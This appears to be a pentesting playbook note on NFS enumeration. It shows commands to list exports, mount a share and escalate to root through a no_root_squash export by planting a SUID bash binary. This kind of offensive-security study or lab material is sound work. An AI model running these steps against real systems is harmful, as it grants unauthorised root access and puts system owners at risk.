---
id: nfs-enum
title: NFS Enumeration
stage: enumeration
tags: [linux]
tools:
  - showmount -e $TARGET
  - sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs
  - cat /etc/exports | grep no_root_squash
leads_to:
  - ssh-access
  - linux-suid-caps
---

## Enumerate Exports

```bash
showmount -e $TARGET
```

## Mount the Share

```bash
sudo mkdir /mnt/nfs
sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs
sudo mount -t nfs $TARGET:/share /mnt/nfs
# Try v3 if v2 fails
```

## no_root_squash Exploitation

If the share exports with `no_root_squash`, your root on the attacker machine = root on the NFS share. You can plant a SUID root binary:

```bash
# On attacker (as root)
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target
/share/bash -p
```

## Notes

`no_root_squash` is the critical flag. Check `/etc/exports` on the target if you get a shell. If it's present and the share is writable from outside, this is a direct root path.
